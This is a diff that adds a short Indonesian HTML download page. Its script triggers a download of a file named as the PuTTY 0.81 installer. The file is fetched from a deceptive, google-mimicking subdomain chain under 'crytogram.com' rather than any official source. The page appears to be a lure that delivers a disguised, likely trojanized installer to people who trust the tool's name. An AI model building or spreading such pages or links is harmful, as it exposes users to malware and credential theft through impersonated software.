@@ -1,0 +1,55 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Halaman Unduhan</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f4f4f4;
+        }
+
+        .container {
+            text-align: center;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Selamat Datang di Halaman Unduhan</h1>
+        <button onclick="downloadFile()">Unduh File</button>
+    </div>
+    <script>
+        function downloadFile() {
+            // Ganti URL berikut dengan URL file yang ingin Anda unduh
+            var fileUrl = 'https://ong-domain-tester-accounts-subdo-tester-domain-accounts-google.commmmmmmmmm.bug.commmmmmmmmm.bug.omapip.my.id.crytogram.com/putty-64bit-0.81-installer.msi';
+            
+            // Membuat elemen anchor untuk men-trigger unduhan
+            var link = document.createElement('a');
+            link.href = fileUrl;
+            link.download = 'putty-64bit-0.81-installer.msi'; // Ganti dengan nama file yang diinginkan
+            document.body.appendChild(link);
+            
+            // Men-trigger klik pada elemen anchor untuk memulai unduhan
+            link.click();
+            
+            // Menghapus elemen anchor setelah unduhan selesai
+            document.body.removeChild(link);
+        }
+    </script>
+</body>
+</html>
